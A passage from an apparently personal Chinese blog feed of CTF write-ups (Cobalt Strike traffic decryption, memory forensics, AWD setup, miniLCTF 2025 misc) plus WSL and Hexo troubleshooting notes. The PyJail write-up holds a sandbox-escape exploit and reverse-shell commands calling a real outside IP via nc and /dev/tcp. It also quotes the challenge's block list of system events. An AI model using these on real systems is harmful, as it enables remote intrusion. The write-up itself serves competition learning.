new_img)        print(&quot;已保存到运行目录中...&quot;)    else:        print(&quot;参数-p或参数-n或参数-size, 输入错误!&quot;)

python get_pixels.py -f 1.png -p 5x5+1915x1075 -n 10x10

得到：


这个是veracrypt加密的磁盘文件，需要我们挂载
挂载需要密钥。密钥文件


然后点加载,就能在z盘里看到flag




3.杂题2023 sictf 一起上号不从这道题浅看CS流量分析
拿到一个pcapng，先foremost一下得到一个zip，解压出来一个key文件
这个key肯定就是常用的.cobaltstrike.beacon_keys文件了，保存下来
之后我们还需要拿到两样东西：一个是元数据（cookie的加密数据），一个是submit.php里的data
过滤一下http很快就能发现cookie-元数据：


元数据：
U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s=

接下来就是submit.php了：


内容：
000000c093dff6b2f058ba4231e3900276566441f2bb4c76e5c8480874a4d99df083054a5ea1dd4aea5523c751af7d123ee8e9f2253a5ccdcf54427d147c556b15657ee2607e92b35732f26341bc0a26c58bf2bcf2383ad640641c364159387223360cc16ff3dc14ab1f00e6ee4fb53f5e15b767bd379451d0d7b6f4aeae9db0c3f30f3ef167b7db3e6ac241643ed2513e73f9e9148ebe7afaa122ea75e945c8ab8a816179e43180257bd8be752827dd0de26826d5611ee09391ee5545897dae1d3a9698

这里的subphp有四个，对应四个心跳包，都有可能藏flag，需要一个个尝试
经尝试，第三个是藏flag的，即上面这个
执行脚本：
import hmacimport base64import hashlibimport hexdumpimport binasciiimport javaobj.v2 as javaobjfrom Crypto.Cipher import AESfrom Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5file_path = &quot;.cobaltstrike.beacon_keys&quot;encode_data = &quot;U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s=&quot;encrypt_data = &quot;000000c093dff6b2f058ba4231e3900276566441f2bb4c76e5c8480874a4d99df083054a5ea1dd4aea5523c751af7d123ee8e9f2253a5ccdcf54427d147c556b15657ee2607e92b35732f26341bc0a26c58bf2bcf2383ad640641c364159387223360cc16ff3dc14ab1f00e6ee4fb53f5e15b767bd379451d0d7b6f4aeae9db0c3f30f3ef167b7db3e6ac241643ed2513e73f9e9148ebe7afaa122ea75e945c8ab8a816179e43180257bd8be752827dd0de26826d5611ee09391ee5545897dae1d3a9698&quot;def format_key(key_data):    key_data = bytes(map(lambda x: x &amp; 0xFF, key_data))    formatted_key = f&quot;-----BEGIN PRIVATE KEY-----\n&quot;    formatted_key += base64.encodebytes(key_data).decode()    formatted_key += f&quot;-----END PRIVATE KEY-----&quot;    return formatted_keydef decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):    if hmac.new(hmac_key, encrypted_data, digestmod=&quot;sha256&quot;).digest()[:16] != signature:        print(&quot;message authentication failed&quot;)        return    cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)    return cipher.decrypt(encrypted_data)with open(file_path, &quot;rb&quot;) as fd:    pobj = javaobj.load(fd)PRIVATE_KEY = format_key(pobj.array.value.privateKey.encoded.data)private_key = RSA.import_key(PRIVATE_KEY.encode())cipher = PKCS1_v1_5.new(private_key)ciphertext = cipher.decrypt(base64.b64decode(encode_data), 0)if ciphertext[0:4] == b&#x27;\x00\x00\xBE\xEF&#x27;:    raw_aes_keys = ciphertext[8:24]    raw_aes_hash256 = hashlib.sha256(raw_aes_keys).digest()    aes_key = raw_aes_hash256[0:16]    hmac_key = raw_aes_hash256[16:]SHARED_KEY = binascii.unhexlify(aes_key.hex())HMAC_KEY = binascii.unhexlify(hmac_key.hex())encrypt_data = base64.b64encode(bytes.fromhex(encrypt_data)).decode()encrypt_data = base64.b64decode(encrypt_data)encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder=&#x27;big&#x27;, signed=False)encrypt_data_l = encrypt_data[4:]data1 = encrypt_data_l[:encrypt_data_length-16]signature = encrypt_data_l[encrypt_data_length-16:encrypt_data_length]iv_bytes = b&quot;abcdefghijklmnop&quot;dec = decrypt(data1, iv_bytes, signature, SHARED_KEY, HMAC_KEY)print(&quot;AES key: &#123;&#125;&quot;.format(aes_key.hex()))print(&quot;HMAC key: &#123;&#125;&quot;.format(hmac_key.hex()))print(dec[12:int.from_bytes(dec[4:8], byteorder=&#x27;big&#x27;, signed=False)])print(hexdump.hexdump(dec))

脚本项目地址： 5ime&#x2F;CS_Decrypt: CobaltStrike流量解密脚本
得到：


flag：SICTF{88a39373-e204-43b6-b321-33ac8972fde9}
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>blog 为何上传不了图像的解决</title>
    <url>/2024/11/blog-%E4%B8%BA%E4%BD%95%E4%B8%8A%E4%BC%A0%E4%B8%8D%E4%BA%86%E5%9B%BE%E5%83%8F%E7%9A%84%E8%A7%A3%E5%86%B3/</url>
    <content><![CDATA[前两天我一直困在为何博客上传不了图像而现在我似乎找到了解决方法首先你要先下了hexo-asset-image
而且在config.yml里有个post_asset_folder:要为true
要做到创建新博客时候能在同目录下自动创建同名文件夹，img就可以放在这个文件夹里面
然后再typora里设置要选择优先相对路径（这个很重要
保证相对路径的时候再插入图片
插入图片后查看github对应的文件夹下面有没有相应的图片
因为本质上插入的图片引用的是github的路径，如果github对应目录上没有该图片的话自然在博客上显示不出来
然后再
hexo g

hexo s

hexo d

三连试试，每试完一遍可以直接去github上看看，如果没有这个图片的话试试这个
hexo clean

就这四个来回试，直到对应的github文件夹下出现对应图片就可以上传成功了

类似于这样，要在github目录下能看到，而且似乎图片的命名要简单（？
如果还传不上去的话可以缩放图片试试
（猜想：说不定可以直接在github上add file，下次试试）
ps：（这是不是图片加载慢的原因？）
顺便记录一下我博客的其他问题的解决友链我靠我之前友链一直不能输中文，否则就会报错+显示不了
现在才发现是vs的问题，，用记事本编辑就能正常上传+打开了。服了
评论区我用的是Valine，要去LeanCloud注册账号才行，网上教程很多
但是好像有泄露的风险？
搜索我是去algolia注册账号才能搜索的
结果发现只能所搜文章的标题，不能搜索文章里的内容（我要你有啥用？
待解决
]]></content>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>awd初体验</title>
    <url>/2024/12/awd%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    <content><![CDATA[前言哎，，再次感到misc果然还是要会点web或者re才行
这个awd会给你一个服务器需要你ssh连接起来，连起来之后需要tar下html里面的东西，然后查杀漏洞，维护，攻击别人的。
以bugku的awd为例报名比赛后能得到一些东西，比如ip白名单，账号密码，token，虚拟ip等
ip白名单——队长加的队员ip
账号密码——一会连ssh有用（以：分隔）
token——提交flag时用
虚拟ip——连ssh，注意端口是2222
使用Tabby连接项目地址： https://tabby.sh/ 注意要下windows的（tabby基础讲解： 这里）
打开后点开设置/配置与连接


点击新建/新配置，选择ssh连接
看到一个空白页面，填写：
名称—主机—端口—用户名—密码
如下：


然后点击新建页面旁边的那个框框，再选择刚刚建的ssh就可以开始连接了


等一会就连接成功了
SFTP传输工具tabby是自带sftp工具的，连接成功后在右上角就能看到
点开后能弹出服务器上的目录，如果想下载里面的一些东西可以直接点击会出现保存文件的提示，然后保存就行
如果想上传文件可以直接拖拽文件，也能点右上角的upload
html相关下载——tar命令连接成功之后可以打包下载html里的东西了，在var/www/html里。
但是html是无法直接下的，那怎么办呢？使用tar命令
tar -czvf myfolder.tar.gz /var/www/html/*# 这个命令会打包html里的所有东西tar -czvf web.tar.gz ./*# 打包当前目录下所有东西到当前文件夹下

打包完成的东西在home的一个文件夹里（这里是忘了具体在哪了。。）
然后就能看到一个myfolder.tar.gz或者web.tar.gz，直接点击保存下来就好
查找漏洞+修改+上传保存下来的html文件夹可以用D盾来扫描漏洞，然后找到对应漏洞，修改。
这里可以直接在tabby上的服务器文件里修改，或者本地修改完再上传到服务器上
改完漏洞就能加固我们的防御了。
沙箱跑木马我们可以利用在线沙箱来跑恶意代码，顺便让它帮我们分析一下
安恒云沙箱： 安恒云沙箱-下一代沙箱的领航者
如果是哥斯拉，蚁剑，冰蝎，天蝎，之类的常规工具可以直接分析出来
apache日志分析
常见日志文件位置



Apache日志
访问日志 ：默认位置通常是&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log.1（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log.1（CentOS&#x2F;RHEL）。
错误日志 ：默认位置通常是&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log.1（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;httpd&#x2F;error_log.1（CentOS&#x2F;RHEL）。


SSH日志
身份验证日志 ：通常位于&#x2F;var&#x2F;log&#x2F;auth.log（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;secure（CentOS&#x2F;RHEL）。


系统日志
系统日志 ：通常位于&#x2F;var&#x2F;log&#x2F;syslog（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;messages（CentOS&#x2F;RHEL）。




我们可以进入/var/log/apache2日志目录。
可以dump下来分析，也可以直接在上面筛选
需要一定的linux知识


cut: 这是一个命令，用于从每一行文本中剪切出指定部分。
-d-: 指定分隔符为 -
-f 1: 指定要剪切的字段为第一个字段。
access.log.1: 这是要处理的日志文件的文件名或路径。


uniq -c: 这个命令会从输入中删除重复的行，并且计算每行重复出现的次数。
-c: 会在输出中显示每行重复出现的次数。


sort : 这个命令会对输入进行排序。
-r: 表示反向排序，即降序排列。
-n: 表示按照数值大小排序。


head -20: 最后，这个命令会从排序后的结果中提取前 20 行。
| : 管道命令符，表示前一项的输出结果作为后一项的输入


]]></content>
      <categories>
        <category>AWD</category>
      </categories>
      <tags>
        <tag>awd</tag>
      </tags>
  </entry>
  <entry>
    <title>newstar2024小明同学们复现</title>
    <url>/2024/12/newstar2024%E5%B0%8F%E6%98%8E%E5%90%8C%E5%AD%A6%E4%BB%AC%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[主要最近发现自己的取证题目比较薄弱，于是拿小明同学们练练手。
1.热心助人的小明同学这个很简单，只要装好vol2，然后lsadump看密码就好
先看操作版本
vol.py -f image.raw imageinfo



看到操作版本是 Win7SP1x86_23418
然后直接lsadump就好


密码：ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh（开头的0x48不是密码）
所以flag：flag{ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh}
2.擅长音游的小明同学拿到一个chal_fixed.E01文件，使用FTK挂载 （最好用4.2版本的
在win7那个下面的root/users/desktop可以看到



[!NOTE]
真相.txt
真相会不经意间流入日常的点点滴滴……真相在哪里?


[!NOTE]
要开始了呦.txt
今天舞萌彩框了好开心啊o(￣▽￣)ブ我要把这一刻用照片保存下来不过在拍摄rating变化的瞬间总感觉有什么东西藏进照片里了打开也没发现什么异常，但是体积好像变大了一点是错觉吗？

可以发现跟图片有关，而在照片文件里面找到ColorfulDog.jpg


没啥思路了binwalk一下（感觉挺正常的
发现一个txt内容是：
听好了听好了听好了听好了听好了听好了听好了： 1919年8月10日，世界就此陷落， 陷落的世界都将迎来一场漩涡， 为这个世界带来有关弗拉格尚未知晓的真相。 但发掘真相的道路被加诸混沌的历练 世界的宽高未被正确丈量 当真相被混沌打乱时 真相将不复存在 也许，在世界的重置和轮回中能找到发现真相的方法…… 至此，尘埃落定 至此，一锤定音 #音游# #NewStarcaea# #Misc#
然后我们挂载这个E01，注意要在FTK上右键加载镜像，进行加载


使用VM挂载一下，注意要用管理员运行。
这里要选择UEFI


挂载出问题了。。。
3.擅长加密的小明同学拿到了一个vhd和一个君は加密本当に上手だな.zip，解压得到一个raw文件
vhd双击打开发现要BitLocker解密，我们使用Elcomsoft Forensic Disk Decryptor
选择decrypt or mount disk / image file of disk\partition


进行恢复，得到key：408320-285065-614779-610940-547107-218229-492195-125422
输入恢复密钥之后得到了一个flag.7z，解压需要密码。
7z在密码复杂的情况下几乎不可能被爆破出来，所以我们看raw文件。
查看操作版本


查看有什么进程


看到有一个mspaint.exe（画图进程），我们提取出来，使用 memdump：


然后改后缀为data，拉入GIMP.
图像类型选择RGB透明，拉X,Y,Z，最后得到：


压缩包密码：rxnifbeiyomezpplugho
解压出来得到：flag{5ZCb44Gv5Y+W6K+B5pys5b2T44Gr5LiK5omL}
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>wsl启动出错</title>
    <url>/2024/12/wsl%E5%90%AF%E5%8A%A8%E5%87%BA%E9%94%99/</url>
    <content><![CDATA[wsl启动出错启动出错如下：
由于未安装所需的特性，无法启动操作。错误代码: Wsl/Service/CreateInstance/CreateVm/HCS/HCS_E_SERVICE_NOT_AVAILABLEPress any key to continue...



1.启用了 WSL 所需的功能可以以管理员身份在powershell输入以下命令：
dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestartdism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart

然后重启电脑，看wsl还能运行吗
我是运行了这个就好了，界面：
C:\Windows\System32&gt;dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart部署映像服务和管理工具版本: 10.0.26100.1150映像版本: 10.0.26100.2454启用一个或多个功能[==========================100.0%==========================]操作成功完成。C:\Windows\System32&gt;dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart部署映像服务和管理工具版本: 10.0.26100.1150映像版本: 10.0.26100.2454启用一个或多个功能[==========================100.0%==========================]操作成功完成。



2.更新 WSL 核心WSL 需要最新版本的核心来支持虚拟机实例。更新核心：
wsl --update

运行后检查版本
wsl --version



3.检查虚拟化支持确保启用了虚拟化支持
4.重置或重装 WSL实在不行重置 WSL：
wsl --unregister &lt;你的发行版名称&gt;

或者重装 WSL：
wsl --install



5.检查 Windows 服务错误代码中提到 HCS_E_SERVICE_NOT_AVAILABLE 可能表明相关服务未运行：
按 
Win + R

 键，输入 
services.msc

，检查以下服务是否已启动：
Hyper-V Host Compute Service
Virtual Machine Management
如果未启动，右键启动这些服务。
]]></content>
      <tags>
        <tag>wsl</tag>
      </tags>
  </entry>
  <entry>
    <title>miniLCTF2025misc全解</title>
    <url>/2025/05/miniLCTF2025misc%E5%85%A8%E8%A7%A3/</url>
    <content><![CDATA[吃豆人简单的前端游戏，不知道为什么扔到misc了。。
看一眼源码


那就预先在控制台输好score
输完再私一下就拿到flag




麦霸评分先本地wsrx连接上环境，我这里是6033
题目要求唱歌然后打分，我们py写个脚本把原始音频下过来，再传上去就好了
#!/usr/bin/env python3# -*- coding: utf-8 -*-import requestsdef get_flag(base_url: str = &quot;http://127.0.0.1:6033&quot;):    session = requests.Session()    # 1. 先下载原始音频    print(&quot;[*] 正在下载原始音频…&quot;)    resp = session.get(f&quot;&#123;base_url&#125;/original.wav&quot;)    resp.raise_for_status()    audio_data = resp.content    # （可选）调用一次 /prepare-recording 来清理旧录音    try:        session.get(f&quot;&#123;base_url&#125;/prepare-recording&quot;, timeout=5)    except Exception:        pass  # 出错也不影响    # 2. 上传「你的录音」——其实就是原始音频本身    print(&quot;[*] 正在上传“录音”进行对比…&quot;)    files = &#123;        &#x27;audio&#x27;: (&#x27;original.wav&#x27;, audio_data, &#x27;audio/wav&#x27;)    &#125;    resp2 = session.post(f&quot;&#123;base_url&#125;/compare-recording&quot;, files=files)    resp2.raise_for_status()    # 3. 解析返回的 JSON，拿 flag    data = resp2.json()    if data.get(&quot;flag&quot;):        print(&quot;🎉 Flag:&quot;, data[&quot;flag&quot;])    else:        print(&quot;⚠️ 服务器返回:&quot;, data)if __name__ == &quot;__main__&quot;:    get_flag()





PyJail连上即给源码
import socketserverimport sysimport astimport iowith open(__file__, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f:    source_code = f.read()class SandboxVisitor(ast.NodeVisitor):    def visit_Attribute(self, node):        if isinstance(node.attr, str) and node.attr.startswith(&quot;__&quot;):            raise ValueError(&quot;Access to private attributes is not allowed&quot;)        self.generic_visit(node)def safe_exec(code: str, sandbox_globals=None):    original_stdout = sys.stdout    original_stderr = sys.stderr    sys.stdout = io.StringIO()    sys.stderr = io.StringIO()    if sandbox_globals is None:        sandbox_globals = &#123;            &quot;__builtins__&quot;: &#123;                &quot;print&quot;: print,                &quot;any&quot;: any,                &quot;len&quot;: len,                &quot;RuntimeError&quot;: RuntimeError,                &quot;addaudithook&quot;: sys.addaudithook,                &quot;original_stdout&quot;: original_stdout,                &quot;original_stderr&quot;: original_stderr            &#125;        &#125;    try:        tree = ast.parse(code)        SandboxVisitor().visit(tree)        exec(code, sandbox_globals)        output = sys.stdout.getvalue()        sys.stdout = original_stdout        sys.stderr = original_stderr        return output, sandbox_globals    except Exception as e:        sys.stdout = original_stdout        sys.stderr = original_stderr        return f&quot;Error: &#123;str(e)&#125;&quot;, sandbox_globalsCODE = &quot;&quot;&quot;def my_audit_checker(event, args):    blocked_events = [        &quot;import&quot;, &quot;time.sleep&quot;, &quot;builtins.input&quot;, &quot;builtins.input/result&quot;, &quot;open&quot;, &quot;os.system&quot;,         &quot;eval&quot;,&quot;subprocess.Popen&quot;, &quot;subprocess.call&quot;, &quot;subprocess.run&quot;, &quot;subprocess.check_output&quot;    ]    if event in blocked_events or event.startswith(&quot;subprocess.&quot;):        raise RuntimeError(f&quot;Operation not allowed: &#123;event&#125;&quot;)addaudithook(my_audit_checker)&quot;&quot;&quot;class Handler(socketserver.BaseRequestHandler):    def handle(self):        self.request.sendall(b&quot;Welcome to Interactive Pyjail!\n&quot;)        self.request.sendall(b&quot;Rules: No import / No sleep / No input\n\n&quot;)        try:            self.request.sendall(b&quot;========= Server Source Code =========\n&quot;)            self.request.sendall(source_code.encode() + b&quot;\n&quot;)            self.request.sendall(b&quot;========= End of Source Code =========\n\n&quot;)        except Exception as e:            self.request.sendall(b&quot;Failed to load source code.\n&quot;)            self.request.sendall(str(e).encode() + b&quot;\n&quot;)        self.request.sendall(b&quot;Type your code line by line. Type &#x27;exit&#x27; to quit.\n\n&quot;)        prefix_code = CODE        sandbox_globals = None        while True:            self.request.sendall(b&quot;&gt;&gt;&gt; &quot;)            try:                user_input = self.request.recv(4096).decode().strip()                if not user_input:                    continue                if user_input.lower() == &quot;exit&quot;:                    self.request.sendall(b&quot;Bye!\n&quot;)                    break                if len(user_input) &gt; 100:                    self.request.sendall(b&quot;Input too long (max 100 chars)!\n&quot;)                    continue                full_code = prefix_code + user_input + &quot;\n&quot;                prefix_code = &quot;&quot;                result, sandbox_globals = safe_exec(full_code, sandbox_globals)                self.request.sendall(result.encode() + b&quot;\n&quot;)            except Exception as e:                self.request.sendall(f&quot;Error occurred: &#123;str(e)&#125;\n&quot;.encode())                breakif __name__ == &quot;__main__&quot;:    HOST, PORT = &quot;0.0.0.0&quot;, 5000    with socketserver.ThreadingTCPServer((HOST, PORT), Handler) as server:        print(f&quot;Server listening on &#123;HOST&#125;:&#123;PORT&#125;&quot;)        server.serve_forever()

省流:
def my_audit_checker(event, args):    blocked_events = [        &quot;import&quot;, &quot;time.sleep&quot;, &quot;builtins.input&quot;, &quot;builtins.input/result&quot;, &quot;open&quot;, &quot;os.system&quot;,         &quot;eval&quot;,&quot;subprocess.Popen&quot;, &quot;subprocess.call&quot;, &quot;subprocess.run&quot;, &quot;subprocess.check_output&quot;    ]    if event in blocked_events or event.startswith(&quot;subprocess.&quot;):        raise RuntimeError(f&quot;Operation not allowed: &#123;event&#125;&quot;)addaudithook(my_audit_checker)

就是要在这个钩子的限制下逃逸并且限制能用的东西只有如下
&quot;__builtins__&quot;: &#123;                &quot;print&quot;: print,                &quot;any&quot;: any,                &quot;len&quot;: len,                &quot;RuntimeError&quot;: RuntimeError,                &quot;addaudithook&quot;: sys.addaudithook,                &quot;original_stdout&quot;: original_stdout,                &quot;original_stderr&quot;: original_stderr                &#125;

并且有提示No import / No sleep / No input
还ban掉了类似ssti向下找的方法


1.ban了关键字&#x27;__&#x27;2.

看了眼，知道是栈帧逃逸
打一个大致的poc
a=(a.gi_frame.f_back.f_back for i in [2]);a=[x for x in a][0]b = a.f_back.f_globals[&#x27;sys&#x27;]os = b.modules.get(&#x27;os&#x27;)

这边其实蛮犹豫要不要用os打的
但是其他模块其实也没什么可以利用的
#sys下的模块&#123;&#x27;sys&#x27;: &lt;module &#x27;sys&#x27; (built-in)&gt;,  &#x27;builtins&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;_frozen_importlib&#x27;: &lt;module &#x27;_frozen_importlib&#x27; (frozen)&gt;,  &#x27;_imp&#x27;: &lt;module &#x27;_imp&#x27; (built-in)&gt;, &#x27;_thread&#x27;: &lt;module &#x27;_thread&#x27; (built-in)&gt;, &#x27;_warnings&#x27;: &lt;module &#x27;_warnings&#x27; (built-in)&gt;, &#x27;_weakref&#x27;: &lt;module &#x27;_weakref&#x27; (built-in)&gt;, &#x27;_io&#x27;: &lt;module &#x27;_io&#x27; (built-in)&gt;,  &#x27;marshal&#x27;: &lt;module &#x27;marshal&#x27; (built-in)&gt;, &#x27;posix&#x27;: &lt;module &#x27;posix&#x27; (built-in)&gt;,  &#x27;_frozen_importlib_external&#x27;: &lt;module &#x27;_frozen_importlib_external&#x27; (frozen)&gt;,  &#x27;time&#x27;: &lt;module &#x27;time&#x27; (built-in)&gt;, &#x27;zipimport&#x27;: &lt;module &#x27;zipimport&#x27; (frozen)&gt;,  &#x27;_codecs&#x27;: &lt;module &#x27;_codecs&#x27; (built-in)&gt;, &#x27;codecs&#x27;: &lt;module &#x27;codecs&#x27; (frozen)&gt;, &#x27;encodings.aliases&#x27;: &lt;module &#x27;encodings.aliases&#x27; from &#x27;/usr/local/lib/python3.11/encodings/aliases.py&#x27;&gt;,  &#x27;encodings&#x27;: &lt;module &#x27;encodings&#x27; from &#x27;/usr/local/lib/python3.11/encodings/__init__.py&#x27;&gt;, &#x27;encodings.utf_8&#x27;: &lt;module &#x27;encodings.utf_8&#x27; from &#x27;/usr/local/lib/python3.11/encodings/utf_8.py&#x27;&gt;,  &#x27;_signal&#x27;: &lt;module &#x27;_signal&#x27; (built-in)&gt;, &#x27;_abc&#x27;: &lt;module &#x27;_abc&#x27; (built-in)&gt;,  &#x27;abc&#x27;: &lt;module &#x27;abc&#x27; (frozen)&gt;,  &#x27;io&#x27;: &lt;module &#x27;io&#x27; (frozen)&gt;,  &#x27;__main__&#x27;: &lt;module &#x27;__main__&#x27; from &#x27;/app/app.py&#x27;&gt;,  &#x27;_stat&#x27;: &lt;module &#x27;_stat&#x27; (built-in)&gt;,  &#x27;stat&#x27;: &lt;module &#x27;stat&#x27; (frozen)&gt;,  &#x27;_collections_abc&#x27;: &lt;module &#x27;_collections_abc&#x27; (frozen)&gt;,  &#x27;genericpath&#x27;: &lt;module &#x27;genericpath&#x27; (frozen)&gt;,  &#x27;posixpath&#x27;: &lt;module &#x27;posixpath&#x27; (frozen)&gt;,  &#x27;os.path&#x27;: &lt;module &#x27;posixpath&#x27; (frozen)&gt;,  &#x27;os&#x27;: &lt;module &#x27;os&#x27; (frozen)&gt;,  &#x27;_sitebuiltins&#x27;: &lt;module &#x27;_sitebuiltins&#x27; (frozen)&gt;,  &#x27;_distutils_hack&#x27;: &lt;module &#x27;_distutils_hack&#x27; from &#x27;/usr/local/lib/python3.11/site-packages/_distutils_hack/__init__.py&#x27;&gt;,  &#x27;site&#x27;: &lt;module &#x27;site&#x27; (frozen)&gt;,  &#x27;_socket&#x27;: &lt;module &#x27;_socket&#x27; from &#x27;/usr/local/lib/python3.11/lib-dynload/_socket.cpython-311-x86_64-linux-musl.so&#x27;&gt;,  &#x27;itertools&#x27;: &lt;module &#x27;itertools&#x27; (built-in)&gt;,  &#x27;keyword&#x27;: &lt;module &#x27;keyword&#x27; from &#x27;/usr/local/lib/python3.11/keyword.py&#x27;&gt;,  &#x27;_operator&#x27;: &lt;module &#x27;_operator&#x27; (built-in)&gt;,  &#x27;operator&#x27;: &lt;module &#x27;operator&#x27; from &#x27;/usr/local/lib/python3.11/operator.py&#x27;&gt;,  &#x27;reprlib&#x27;: &lt;module &#x27;reprlib&#x27; from &#x27;/usr/local/lib/python3.11/reprlib.py&#x27;&gt;,  &#x27;_collections&#x27;: &lt;module &#x27;_collections&#x27; (built-in)&gt;,  &#x27;collections&#x27;: &lt;module &#x27;collections&#x27; from &#x27;/usr/local/lib/python3.11/collections/__init__.py&#x27;&gt;,  &#x27;collections.abc&#x27;: &lt;module &#x27;collections.abc&#x27; from &#x27;/usr/local/lib/python3.11/collections/abc.py&#x27;&gt;,  &#x27;math&#x27;: &lt;module &#x27;math&#x27; from &#x27;/usr/local/lib/python3.11/lib-dynload/math.cpython-311-x86_64-linux-musl.so&#x27;&gt;, &#x27;select&#x27;: &lt;module &#x27;select&#x27; from &#x27;/usr/local/lib/python3.11/lib-dynload/select.cpython-311-x86_64-linux-musl.so&#x27;&gt;, &#x27;selectors&#x27;: &lt;module &#x27;selectors&#x27; from &#x27;/usr/local/lib/python3.11/selectors.py&#x27;&gt;,  &#x27;types&#x27;: &lt;module &#x27;types&#x27; from &#x27;/usr/local/lib/python3.11/types.py&#x27;&gt;,  &#x27;_functools&#x27;: &lt;module &#x27;_functools&#x27; (built-in)&gt;,  &#x27;functools&#x27;: &lt;module &#x27;functools&#x27; from &#x27;/usr/local/lib/python3.11/functools.py&#x27;&gt;,  &#x27;enum&#x27;: &lt;module &#x27;enum&#x27; from &#x27;/usr/local/lib/python3.11/enum.py&#x27;&gt;,  &#x27;errno&#x27;: &lt;module &#x27;errno&#x27; (built-in)&gt;,  &#x27;array&#x27;: &lt;module &#x27;array&#x27; from &#x27;/usr/local/lib/python3.11/lib-dynload/array.cpython-311-x86_64-linux-musl.so&#x27;&gt;, &#x27;socket&#x27;: &lt;module &#x27;socket&#x27; from &#x27;/usr/local/lib/python3.11/socket.py&#x27;&gt;,  &#x27;_weakrefset&#x27;: &lt;module &#x27;_weakrefset&#x27; from &#x27;/usr/local/lib/python3.11/_weakrefset.py&#x27;&gt;,  &#x27;threading&#x27;: &lt;module &#x27;threading&#x27; from &#x27;/usr/local/lib/python3.11/threading.py&#x27;&gt;,  &#x27;socketserver&#x27;: &lt;module &#x27;socketserver&#x27; from &#x27;/usr/local/lib/python3.11/socketserver.py&#x27;&gt;,  &#x27;_ast&#x27;: &lt;module &#x27;_ast&#x27; (built-in)&gt;,  &#x27;contextlib&#x27;: &lt;module &#x27;contextlib&#x27; from &#x27;/usr/local/lib/python3.11/contextlib.py&#x27;&gt;,  &#x27;ast&#x27;: &lt;module &#x27;ast&#x27; from &#x27;/usr/local/lib/python3.11/ast.py&#x27;&gt;&#125;

接着用
print(os.listdir(&#x27;/&#x27;))

看到了这个


接着就有点迷糊不知道怎么读取了
因为open和system这些能利用的都被ban了
r, w = os.pipe()pid = os.fork()os.close(r); os.dup2(w, 1);os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, f&#x27;cat /flag.txt&#x27;]); os._exit(0)os.close(w); os.waitpid(pid, 0); data = os.read(r, 4096); print(data.decode())


看来需要根据时间来查一下
替换一下为os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;find / -mtime 1 -print&#x27;]); 



大概找到路径了
但是问题来了
在这样的路径下怎么读取呢?
一般说，这样的路径用linux执行是会被转义的
而在python中也拒绝\x0a这类的出现
然后有一个递归读取的东西
完整poc:
a=(a.gi_frame.f_back.f_back for i in [2]);a=[x for x in a][0]b = a.f_back.f_globals[&#x27;sys&#x27;]os = b.modules.get(&#x27;os&#x27;)r, w = os.pipe()pid = os.fork()os.close(r); os.dup2(w, 1);os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;ls -la&#x27;]); os._exit(0)#os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, f&#x27;wc -c &#123;path&#125;&#x27;]); os._exit(0)os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;find /tmp -type f -exec cat &#123;&#125; \\;&#x27;]); os._exit(0)os.close(w); os.waitpid(pid, 0); data = os.read(r, 512); print(data.decode())os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;find /tmp/.\\x0a\\x0b\\x00hidden/ -mtime 1 -print&#x27;]); find / -mtime 1 -printos.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;busybox nc 111.229.205.196 9001 -e sh&#x27;]); os._exit(0)os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh -i &gt;&amp; /dev/tcp/111.229.205.196/9001 0&gt;&amp;1&#x27;]); os._exit(0)os.close(w); os.waitpid(pid, 0); data = os.read(r, 4096); print(data.decode())//缓冲区太大

中间是有一个小插曲的
就是他的那个目录下
哈哈一点都不好笑
而且缓存区开太大靶机会直接死机
中间一段直接红温了
好在最后还是出了，拿了3血，www
MiniForensicsⅠ看到桌面上有个“没什么用的b.txt”
